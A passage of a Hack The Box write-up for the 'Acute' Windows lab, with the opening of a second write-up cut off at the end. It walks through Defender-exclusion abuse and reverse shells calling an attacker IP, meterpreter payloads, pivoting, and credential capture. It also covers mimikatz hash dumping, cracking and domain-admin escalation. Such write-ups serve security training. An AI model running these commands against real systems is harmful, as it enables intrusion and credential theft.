06/12/2021 11:06 Program Files d-r--- 07/12/2021 12:43 Program Files (x86) d-r--- 21/12/2021 22:50 Users d----- 21/12/2021 22:53 Utils d----- 16/12/2021 1:23 Windows PS C:\\Users\\edavies\\Documents\u0026gt; dir C:\\Users Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 21/12/2021 13:01 administrator.ACUTE d----- 22/12/2021 1:26 edavies d----- 21/12/2021 22:50 jmorgan d----- 19/11/2021 9:29 Natasha d-r--- 18/11/2020 23:43 Public PS C:\\Users\\edavies\\Documents\u0026gt; ipconfig Windows IP Configuration Ethernet adapter Ethernet 2: Connection-specific DNS Suffix . : Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14 IPv4 Address. . . . . . . . . . . : 172.16.22.2 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 172.16.22.1 PS C:\\Users\\edavies\\Documents\u0026gt;  We see that we are not in the machine we need to compromise because the IP address is 172.16.22.2 and we want 10.10.11.145.\nLet\u0026rsquo;s enumerate a bit more:\nPS C:\\Users\\edavies\\Documents\u0026gt; cd C:\\Users PS C:\\Users\u0026gt; tree Folder PATH listing Volume serial number is 8A9A-E124 C:. ÃÄÄÄadministrator.ACUTE ÃÄÄÄedavies ³ ÃÄÄÄ3D Objects ³ ÃÄÄÄContacts ³ ÃÄÄÄDesktop ³ ÃÄÄÄDocuments ³ ÃÄÄÄDownloads ³ ÃÄÄÄFavorites ³ ÃÄÄÄLinks ³ ÃÄÄÄMusic ³ ³ ÀÄÄÄPlaylists ³ ÃÄÄÄOneDrive ³ ÃÄÄÄPictures ³ ³ ÀÄÄÄCamera Roll ³ ÃÄÄÄSaved Games ³ ÃÄÄÄSearches ³ ÀÄÄÄVideos ³ ÀÄÄÄCaptures ÃÄÄÄjmorgan ÃÄÄÄNatasha ÀÄÄÄPublic  There is nothing interesting on the users\u0026rsquo; folders. Do we have useful privileges or do we belong to any group?\nPS C:\\Users\u0026gt; whoami /all USER INFORMATION ---------------- User Name SID ============= ============================================== acute\\edavies S-1-5-21-1786406921-1914792807-2072761762-1106 GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled.  Domain controller enumeration It doesn\u0026rsquo;t seem so. The default gateway of Acute-PC01 is the principal machine:\nPS C:Users\\\u0026gt; nslookup atsserver.acute.local DNS request timed out. timeout was 2 seconds. Server: UnKnown Address: 172.16.22.1 Name: atsserver.acute.local Addresses: dead:beef::283e:7912:47ab:5601 dead:beef::1f9 172.16.22.1 10.10.11.145 PS C:Users\\\u0026gt; nslookup acute.local DNS request timed out. timeout was 2 seconds. Server: UnKnown Address: 172.16.22.1 Name: acute.local Addresses: dead:beef::1f9 dead:beef::283e:7912:47ab:5601 172.16.22.1 10.10.11.145  Let\u0026rsquo;s perform a port scan on this machine:\nPS C:\\Users\u0026gt; 53,88,135,389,445,1443,5985 | % {echo ((New-Object Net.Sockets.TcpClient).Connect('172.16.22.1', $_)) \"Port $_ : open\"} 2\u0026gt;$null Port 53 : open Port 88 : open Port 135 : open Port 389 : open Port 445 : open Port 5985 : open  It seems like a domain controller of an Active Directory environment because it has ports 53 (DNS), 88 (Kerberos), 135 (MS-RPC), 389 (LDAP) and 445 (SMB) open.\nIn order to attack the domain controller, we must use Acute-PC01 as a pivot. I will use chisel as a SOCKS5 proxy and use AD offensive tools from the attacker machine. We can compile it for Windows or download the compiled binary from the releases section.\nFirst of all, let\u0026rsquo;s use a reverse shell to have more control. I will use ConPtyShell. If we try to upload it in C:\\Windows\\Temp using a Python HTTP server, Windows Defender blocks it:\nPS C:\\Users\u0026gt; cd C:\\Windows\\Temp PS C:\\Windows\\Temp\u0026gt; curl http://10.10.17.44/ConPtyShell.exe -o r.exe PS C:\\Windows\\Temp\u0026gt; .\\r.exe Program 'r.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software. + CategoryInfo : ResourceUnavailable: (:) [], ApplicationFailedException + FullyQualifiedErrorId : NativeCommandFailed   We can query for folders that are not inspected using this query:\nPS C:\\Windows\\Temp reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths C:\\Utils REG_DWORD 0x0 C:\\Windows\\System32 REG_DWORD 0x0  So C:\\Utils is not verified. Let\u0026rsquo;s download the binary in that folder:\nPS C:\\Windows\\Temp\u0026gt; cd C:\\Utils PS C:\\Utils\u0026gt; curl http://10.10.17.44/ConPtyShell.exe -o r.exe  Now, from the attacker machine we start a nc listener and execute the binary in Acute-PC01:\nPS C:\\Utils\u0026gt; .\\r.exe 10.10.17.44 4444 50 158 CreatePseudoConsole function found! Spawning a fully interactive shell  And we receive the connection back:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.145. Ncat: Connection from 10.10.11.145:49865. ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Utils\u0026gt;  Screenshots from a remote desktop session At this point, we can run winpeas.exe to enumerate a bit more:\nPS C:\\Utils\u0026gt; curl http://10.10.17.44/winPEASx64.exe -o w.exe  There is a running RDP session:\n╔══════════╣ RDP Sessions SessID pSessionName pUserName pDomainName State SourceIP 1 Console edavies ACUTE Active  We can also get this information with this command:\nPS C:\\Utils\u0026gt; query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME edavies console 1 Active none 17/02/2022 20:06  Now we will connect to this session using rdesktop from the attacker machine. For that, we need to use chisel to make Acute-PC01 behave as a pivot (SOCKS5 proxy).\n$ ./chisel server --port 1234 --reverse --socks5 server: Reverse tunnelling enabled server: Fingerprint 5poOpBwlXtp1WxVRCm7EbKeboWO2ERpbS+LdvV4V6CY= server: Listening on http://0.0.0.0:1234  PS C:\\Utils\u0026gt; curl http://10.10.17.44/chisel.exe -o c.exe PS C:\\Utils\u0026gt; .\\c.exe client 10.10.17.44:1234 R:socks client: Connecting to ws://10.10.17.44:1234 client: Connected (Latency 36.4951ms)  And the connections stablishes successfully:\n$ ./chisel server --port 1234 --reverse --socks5 server: Reverse tunnelling enabled server: Fingerprint 5poOpBwlXtp1WxVRCm7EbKeboWO2ERpbS+LdvV4V6CY= server: Listening on http://0.0.0.0:1234 server: session#1: Client version (0.0.0-src) differs from server version (1.7.7) server: session#1: tun: proxy#R:127.0.0.1:1080=\u0026gt;socks: Listening  Let\u0026rsquo;s check that we reach the machine:\n# proxychains4 -q nmap -sT -sV -p 445,3389 172.16.22.1 Starting Nmap 7.92 ( https://nmap.org ) RTTVAR has grown to over 2.3 seconds, decreasing to 2.0 RTTVAR has grown to over 2.3 seconds, decreasing to 2.0 Nmap scan report for 172.16.22.1 Host is up (13s latency). PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 3389/tcp closed ms-wbt-server Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.25 seconds  We see that RDP is closed. Maybe the session is still active, so we can take a screenshot and view it. We need to use Metasploit for that purpose.\nFirst, we create a binary with a meterpreter shell:\n$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f exe -o m.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 200262 bytes Final size of exe file: 206848 bytes Saved as: m.exe  We start a listener using msfconsole:\n# msfconsole -q msf6 \u0026gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/x64/meterpreter_reverse_tcp payload =\u0026gt; windows/x64/meterpreter_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set LPORT 4444 LPORT =\u0026gt; 4444 msf6 exploit(multi/handler) \u0026gt; set LHOST 10.10.17.44 LHOST =\u0026gt; 10.10.17.44 msf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 10.10.17.44:4444  Then we upload the binary and run it:\nPS C:\\Utils\u0026gt; curl http://10.10.17.44/m.exe -o m.exe PS C:\\Utils\u0026gt; .\\m.exe  And we receive the connection:\n# msfconsole -q msf6 \u0026gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/x64/meterpreter_reverse_tcp payload =\u0026gt; windows/x64/meterpreter_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set LPORT 4444 LPORT =\u0026gt; 4444 msf6 exploit(multi/handler) \u0026gt; set LHOST 10.10.17.44 LHOST =\u0026gt; 10.10.17.44 msf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 10.10.17.44:4444 [*] Meterpreter session 1 opened (10.10.17.44:4444 -\u0026gt; 10.10.11.145:49842) meterpreter \u0026gt; getuid Server username: ACUTE\\edavies meterpreter \u0026gt; screenshare [*] Preparing player... [*] Opening player at: ./xjWtVNMB.html [*] Streaming...  With these commands, we will see some real-time screenshots:\nHere we find out that the is a user trying to run these commands:\nEnter-PSSession -computername atsserver $pass = ConvertTo-SecureString \"W3_4R3_th3_f0rce.\" -AsPlaintext -Force $cred = New-Object System.Management.Automation.PSCredential (\"acute\\imonks\", $pass) Enter-PSSession -computername ATSSERVER -credential $cred Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred  Lateral movement to user imonks Now we can continue from the first reverse shell instead of meterpreter and use the above commands to connect to the victim machine using script blocks:\nPS C:\\Utils\u0026gt; $pass = ConvertTo-SecureString \"W3_4R3_th3_f0rce.\" -AsPlaintext -Force PS C:\\Utils\u0026gt; $cred = New-Object System.Management.Automation.PSCredential (\"acute\\imonks\", $pass) PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami } acute\\imonks PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls C:\\Users\\imonks\\Desktop } Directory: C:\\Users\\imonks\\Desktop Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- -ar--- 18/02/2022 10:38 34 user.txt atsserver -a---- 11/01/2022 18:04 602 wm.ps1 atsserver PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type C:\\Users\\imonks\\Desktop\\user.txt } 8df8cbb2405a467ccc13d7af36b0d611  At this point we have captured the user.txt flag.\nLet\u0026rsquo;s check the users that are configured in this machine:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net user } User accounts for \\\\ ------------------------------------------------------------------------------- Administrator awallace chall edavies Guest imonks jmorgan krbtgt lhopkins The command completed with one or more errors.  The user imonks belongs to Managers:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net user imonks /domain } User name imonks Full Name Ieuan Monks Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 21/12/2021 14:51:31 Password expires Never Password changeable 22/12/2021 14:51:31 Password required Yes User may change password No Workstations allowed All Logon script User profile Home directory Last logon 18/02/2022 11:04:17 Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Managers The command completed successfully.  If we query more users that belong to Managers we find out that awallace is also member of Managers:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net groups Managers } Group name Managers Comment Members ------------------------------------------------------------------------------- awallace imonks The command completed successfully.  There is a weird directory in C:\\Program Files, but we don\u0026rsquo;t have permissions to access it:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls \"C:\\Program Files\" } Directory: C:\\Program Files Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- d----- 21/12/2021 00:04 common files atsserver d----- 21/12/2021 00:11 Hyper-V atsserver d----- 15/09/2018 08:12 internet explorer atsserver d----- 18/02/2022 12:54 keepmeon atsserver d----- 21/12/2021 00:04 VMware atsserver d----- 20/12/2021 21:19 Windows Defender atsserver d----- 20/12/2021 21:12 Windows Defender Advanced Threat Protection atsserver d----- 21/12/2021 14:13 WindowsPowerShell atsserver PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls \"C:\\Program Files\\keepmeon\" } Access to the path 'C:\\Program Files\\keepmeon' is denied. + CategoryInfo : PermissionDenied: (C:\\Program Files\\keepmeon:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand + PSComputerName : atsserver  Lateral movement to user jmorgan On the Desktop folder of imonks we saw a PowerShell script:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type C:\\Users\\imonks\\Desktop\\wm.ps1 }  $securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51' $passwd = $securepasswd | ConvertTo-SecureString $creds = New-Object System.Management.Automation.PSCredential (\"acute\\jmorgan\", $passwd) Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds  It is performing some actions on Acute-PC01 as jmorgan. We are able to modify this PowerShell script to gain a reverse shell as jmorgan:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ((cat 'C:\\Users\\imonks\\Desktop\\wm.ps1' -Raw) -Replace 'Get-Volume', ' C:\\Utils\\r.exe 10.10.17.44 5555 50 158 ') | Set-Content -Path C:\\Users\\imonks\\Desktop\\wm.ps1 } PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type C:\\Users\\imonks\\Desktop\\wm.ps1 }  $securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51' $passwd = $securepasswd | ConvertTo-SecureString $creds = New-Object System.Management.Automation.PSCredential (\"acute\\jmorgan\", $passwd) Invoke-Command -ScriptBlock { C:\\Utils\\r.exe 10.10.17.44 5555 50 158 } -ComputerName Acute-PC01 -Credential $creds  And now it is modified. If we run it, we obtain a reverse shell as jmorgan on Acute-PC01:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { C:\\Users\\imonks\\Desktop\\wm.ps1 } CreatePseudoConsole function found! Spawning a fully interactive shell  $ nc -nlvp 5555 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::5555 Ncat: Listening on 0.0.0.0:5555 Ncat: Connection from 10.10.11.145. Ncat: Connection from 10.10.11.145:49872. ^Z zsh: suspended ncat -nlvp 5555 $ stty raw -echo; fg [1] + continued ncat -nlvp 5555 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Users\\jmorgan\\Documents\u0026gt; whoami acute\\jmorgan  Dumping NTLM hashes We discover that jmorgan belongs to Administrators:\nPS C:\\Users\\jmorgan\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288  Hence, we can dump NTLM hashes from SAM using mimikatz.exe:\nPS C:\\Users\\jmorgan\\Documents\u0026gt; cd C:\\Utils PS C:\\Users\\jmorgan\\Documents curl http://10.10.17.44/mimikatz.exe -o mm.exe PS C:\\Utils .\\mm.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz #  Now we must enter privilege::debug, token::elevate, lsadump::sam:\nmimikatz # privilege::debug Privilege '20' OK mimikatz # token::elevate Token Id : 0 User name : SID name : NT AUTHORITY\\SYSTEM 632 {0;000003e7} 0 D 23650 NT AUTHORITY\\SYSTEM S-1-5-18 (04g,31p) Primary -\u0026gt; Impersonated ! * Process Token : {0;00168d80} 0 D 1503149 ACUTE\\jmorgan S-1-5-21-1786406921-1914792807-2072761762-1108 (09g,24p) Primary * Thread Token : {0;000003e7} 0 D 1818149 NT AUTHORITY\\SYSTEM S-1-5-18 (04g,31p) Impersonation (Delegation) mimikatz # lsadump::sam Domain : ACUTE-PC01 SysKey : 44397c32a634e3d8d8f64bff8c614af7 Local SID : S-1-5-21-2560123600-3246320471-2688489995 SAMKey : fb8ee3299f8af5fb2100621a50059fa2 RID : 000001f4 (500) User : Administrator Hash NTLM: a29f7623fd11550def0192de9246f46b lm - 0: c8ff11012182f1dc95a478b25fdde0da ntlm- 0: a29f7623fd11550def0192de9246f46b Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : 7699e833f3fc55323a6c2d9582bb143f * Primary:Kerberos-Newer-Keys * Default Salt : MVL-SVR01.MARVEL.HTBAdministrator Default Iterations : 4096 Credentials aes256_hmac (4096) : c3cd5b6f980fdebc434e04eed27ef73b7e257fda197e008bc7ef1b3502a075a5 aes128_hmac (4096) : 83cb77df0959373fb1f7dbdda42ad684 des_cbc_md5 (4096) : 8f3249ef3dc1bff7 * Packages * NTLM-Strong-NTOWF * Primary:Kerberos * Default Salt : MVL-SVR01.MARVEL.HTBAdministrator Credentials des_cbc_md5 : 8f3249ef3dc1bff7 RID : 000001f5 (501) User : Guest RID : 000001f7 (503) User : DefaultAccount RID : 000001f8 (504) User : WDAGUtilityAccount Hash NTLM: 24571eab88ac0e2dcef127b8e9ad4740 Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : 014e3c3563b7599b4b2ffea6a1f5ce60 * Primary:Kerberos-Newer-Keys * Default Salt : WDAGUtilityAccount Default Iterations : 4096 Credentials aes256_hmac (4096) : 8f08a53f14bbb27f0283fd90323dcd4e21ccc7a119d60cbbafb6c461ded08710 aes128_hmac (4096) : 11e388be492e65daac6493f665631d3f des_cbc_md5 (4096) : 297ad0071abf5b6d * Packages * NTLM-Strong-NTOWF * Primary:Kerberos * Default Salt : WDAGUtilityAccount Credentials des_cbc_md5 : 297ad0071abf5b6d RID : 000003e9 (1001) User : Natasha Hash NTLM: 29ab86c5c4d2aab957763e5c1720486d lm - 0: f82f2bf1f89c2939790e40f751d5b190 ntlm- 0: 29ab86c5c4d2aab957763e5c1720486d ntlm- 1: de3638aef735f9b81ea181465871e71b Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : fdd887d7c6e85189b2cbc37ac772b429 * Primary:Kerberos-Newer-Keys * Default Salt : MVL-SVR01.MARVEL.HTBNatasha Default Iterations : 4096 Credentials aes256_hmac (4096) : 85ef7e3d1d28efc32cec29b4d2e201fc0eb55b05c5e3249f951aba713fe8fe67 aes128_hmac (4096) : 70893ba6dd932940051a0714a3a7b184 des_cbc_md5 (4096) : 978a07d05ba770f7 OldCredentials aes256_hmac (4096) : 6d8e87f273e0260d402c65f1b6c3da5604dacf6d25a543a65827acdf927fd924 aes128_hmac (4096) : dedc1d09097b091f2e430a2c8d768107 des_cbc_md5 (4096) : 1089e6eca449c731 OlderCredentials aes256_hmac (4096) : 6d8e87f273e0260d402c65f1b6c3da5604dacf6d25a543a65827acdf927fd924 aes128_hmac (4096) : dedc1d09097b091f2e430a2c8d768107 des_cbc_md5 (4096) : 1089e6eca449c731 * Packages * NTLM-Strong-NTOWF * Primary:Kerberos * Default Salt : MVL-SVR01.MARVEL.HTBNatasha Credentials des_cbc_md5 : 978a07d05ba770f7 OldCredentials des_cbc_md5 : 1089e6eca449c731  From the above output, we get the following NTLM hashes:\n Administrator:a29f7623fd11550def0192de9246f46b Natasha:29ab86c5c4d2aab957763e5c1720486d WDAGUtilityAccount:24571eab88ac0e2dcef127b8e9ad4740  Instead of using Pass the Hash, we will crack these hashes using john:\n$ echo 'Administrator:a29f7623fd11550def0192de9246f46b' \u0026gt;\u0026gt; hashes $ echo 'Natasha:29ab86c5c4d2aab957763e5c1720486d' \u0026gt;\u0026gt; hashes $ echo 'WDAGUtilityAccount:24571eab88ac0e2dcef127b8e9ad4740' \u0026gt;\u0026gt; hashes $ john --wordlist=$WORDLISTS/rockyou.txt --format=NT hashes Using default input encoding: UTF-8 Loaded 3 password hashes with no different salts (NT [MD4 128/128 ASIMD 4x2]) Press 'q' or Ctrl-C to abort, almost any other key for status Password@123 (Administrator) 1g 0:00:00:00 DONE 1.098g/s 15762Kp/s 15762Kc/s 32676KC/s \"amo-te\"..*7¡Vamos! Use the \"--show --format=NT\" options to display all of the cracked passwords reliably Session completed.  Lateral movement to awallace Now we can access as awallace using the same procedure as before:\nPS C:\\Utils\u0026gt; $pass = ConvertTo-SecureString \"Password@123\" -AsPlaintext -Force PS C:\\Utils\u0026gt; $cred = New-Object System.Management.Automation.PSCredential (\"acute\\awallace\", $pass) PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami } acute\\imonks PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami } acute\\awallace  This user is able to list C:\\Program Files\\keepmeon, and we find a Batch script:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls \"C:\\Program Files\\keepmeon\" } Directory: C:\\Program Files\\keepmeon Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- -a---- 21/12/2021 14:57 128 keepmeon.bat atsserver PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type \"C:\\Program Files\\keepmeon\\keepmeon.bat\" }  REM This is run every 5 minutes. For Lois use ONLY @echo off for /R %%x in (*.bat) do ( if not \"%%x\" == \"%~0\" call \"%%x\" )  This script runs every 5 minutes and basically executes every Batch script in the current directory.\nPrivilege escalation Here we must recall that Lois (lhopkins) is able to change group memberships (shown in the Word document). So we can use a command to add awallace to Site_Admin group:\nPS C:\\Utils\u0026gt; Invoke-Command -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Set-Content -Path net user lhopkins } User name lhopkins Full Name Lois Hopkins Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 21/12/2021 14:51:53 Password expires Never Password changeable 22/12/2021 14:51:53 Password required Yes User may change password No Workstations allowed All Logon script User profile Home directory Last logon 27/02/2022 01:31:45 Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users The command completed successfully. PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Set-Content -Path \"C:\\Program Files\\keepmeon\\a.bat\" -Value net group site_admin } Group name Site_Admin Comment Only in the event of emergencies is this to be populated. This has access to Domain Admin group Members ------------------------------------------------------------------------------- The command completed successfully. PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Set-Content -Path \"C:\\Program Files\\keepmeon\\a.bat\" -Value \"net group site_admin awallace /add /domain\" } PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type \"C:\\Program Files\\keepmeon\\a.bat\" } net group site_admin awallace /add /domain  After some minutes, we find that we belong to Domain Admins, and thus we can read the root.txt flag:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami /groups } GROUP INFORMATION ----------------- Group Name Type SID Attributes ============================================ ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group ACUTE\\Domain Admins Group S-1-5-21-1786406921-1914792807-2072761762-512 Mandatory group, Enabled by default, Enabled group ACUTE\\Managers Group S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory group, Enabled by default, Enabled group ACUTE\\Site_Admin Group S-1-5-21-1786406921-1914792807-2072761762-2102 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group ACUTE\\Denied RODC Password Replication Group Alias S-1-5-21-1786406921-1914792807-2072761762-572 Mandatory group, Enabled by default, Enabled group, Local Group Mandatory Label\\High Mandatory Level Label S-1-16-12288 PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type C:\\Users\\Administrator\\Desktop\\root.txt } 4964aad06240586b6e55bf408011c24e  ","image":"/images/HTB/Acute/Acute.png","permalink":"https://7rocky.github.io/en/htb/acute/","section":"htb","summary":"Hack The Box. Windows. Hard machine. This machine exposes a website where we can find a Word document with useful information and some usernames. There is a PowerShell Web Access where we can access using a default credential and extract another password from a screenshot. There is an Active Directory domain controller where we can execute commands as other users. We will be able to connect to the first machine and dump NTLM hashes and finally become domain administrator. Deep knowledge on PowerShell commands and basic Windows and Active Directory exploitation techniques are needed in order to compromise this machine","time":19,"title":"Acute"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.148   Release: 26 / 02 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.148 -p 22,80 Nmap scan report for 10.10.11.148 Host is up (0.040s latency). PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 | ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA) | 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA) |_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519) 80/tcp open http | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-51297 | Content-Type: text/html; charset=utf-8 | Content-Length: 71 | ETag: W/\"47-iID6daXtR7fCN27hcgS/4V1AKSA\" | Date: | Connection: close | Suspicious activity detected !!! {RequestID: C Z Rf pM 6 anm uqeC } | GetRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-90258 | 